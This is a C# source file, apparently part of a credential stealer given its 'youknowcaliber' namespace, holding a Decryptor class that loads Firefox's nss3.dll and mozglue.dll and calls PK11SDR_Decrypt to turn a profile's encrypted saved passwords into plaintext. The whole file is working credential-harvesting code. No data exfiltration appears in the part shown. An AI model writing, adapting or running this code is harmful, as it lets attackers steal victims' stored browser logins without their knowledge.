﻿using System;
using System.Runtime.InteropServices;
using System.Text;

namespace youknowcaliber
{
	public static class Decryptor
	{
		public static bool LoadNSS(string sPath)
		{
			bool result;
			try
			{
				Decryptor.hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
				Decryptor.hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");
				IntPtr procAddress = WinApi.GetProcAddress(Decryptor.hNss3, "NSS_Init");
				IntPtr procAddress2 = WinApi.GetProcAddress(Decryptor.hNss3, "PK11SDR_Decrypt");
				IntPtr procAddress3 = WinApi.GetProcAddress(Decryptor.hNss3, "NSS_Shutdown");
				Decryptor.fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Nss3.NssInit));
				Decryptor.fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Nss3.Pk11SdrDecrypt));
				Decryptor.fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Nss3.NssShutdown));
				result = true;
			}
			catch (Exception arg)
			{
				Console.WriteLine("Failed to load NSS\n" + arg);
				result = false;
			}
			return result;
		}

		public static void UnLoadNSS()
		{
			Decryptor.fpNssShutdown();
			WinApi.FreeLibrary(Decryptor.hNss3);
			WinApi.FreeLibrary(Decryptor.hMozGlue);
		}

		public static bool SetProfile(string sProfile)
		{
			return Decryptor.fpNssInit(sProfile) == 0L;
		}

		public static string DecryptPassword(string sEncPass)
		{
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				byte[] array = Convert.FromBase64String(sEncPass);
				intPtr = Marshal.AllocHGlobal(array.Length);
				Marshal.Copy(array, 0, intPtr, array.Length);
				Nss3.TSECItem tsecitem = default(Nss3.TSECItem);
				Nss3.TSECItem tsecitem2 = default(Nss3.TSECItem);
				tsecitem2.SECItemType = 0;
				tsecitem2.SECItemData = intPtr;
				tsecitem2.SECItemLen = array.Length;
				bool flag = Decryptor.fpPk11SdrDecrypt(ref tsecitem2, ref tsecitem, 0) == 0;
				if (flag)
				{
					bool flag2 = tsecitem.SECItemLen != 0;
					if (flag2)
					{
						byte[] array2 = new byte[tsecitem.SECItemLen];
						Marshal.Copy(tsecitem.SECItemData, array2, 0, tsecitem.SECItemLen);
						return Encoding.UTF8.GetString(array2);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return null;
			}
			finally
			{
				bool flag3 = intPtr != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return null;
		}

		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		private static IntPtr hNss3;

		private static IntPtr hMozGlue;

		private static Nss3.NssInit fpNssInit;

		private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;

		private static Nss3.NssShutdown fpNssShutdown;
	}
}
